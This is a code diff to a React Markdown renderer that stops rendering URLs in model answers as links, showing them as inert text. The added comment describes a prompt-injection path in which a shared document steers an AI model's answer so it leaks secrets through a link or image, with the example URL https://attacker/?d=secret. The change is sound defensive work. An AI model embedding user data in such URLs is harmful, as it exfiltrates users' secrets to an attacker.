@@ -4,8 +4,14 @@ import { Fragment, type ReactNode } from "react";
 
 /**
  * A small, safe Markdown renderer (no dangerouslySetInnerHTML): code blocks,
- * headings, lists, paragraphs, **bold**, *italic*, `code`, http(s) links and
- * [S1]-style citations rendered as clickable chips.
+ * headings, lists, paragraphs, **bold**, *italic*, `code` and [S1]-style
+ * citations rendered as clickable chips.
+ *
+ * Security: model output is attacker-influenceable (a shared document can
+ * carry a prompt injection), so URLs are rendered as INERT text — never as
+ * links or images. Otherwise an injected answer could hide stolen data in a
+ * link (https://attacker/?d=secret) that leaks on one click, or in an image
+ * that leaks with zero clicks. The full URL stays visible and can be copied.
  */
 export function Markdown({ text, onCite }: { text: string; onCite?: (ref: string) => void }) {
   const blocks: ReactNode[] = [];
@@ -92,9 +98,9 @@ function inline(text: string, onCite?: (ref: string) => void): ReactNode[] {
     }
     if (/^https?:\/\//.test(part)) {
       return (
-        <a key={i} href={part} target="_blank" rel="noopener noreferrer">
+        <span key={i} className="inert-url" title="Links in answers aren't clickable. Copy the address if you trust it.">
           {part}
-        </a>
+        </span>
       );
     }
     return <Fragment key={i}>{part}</Fragment>;
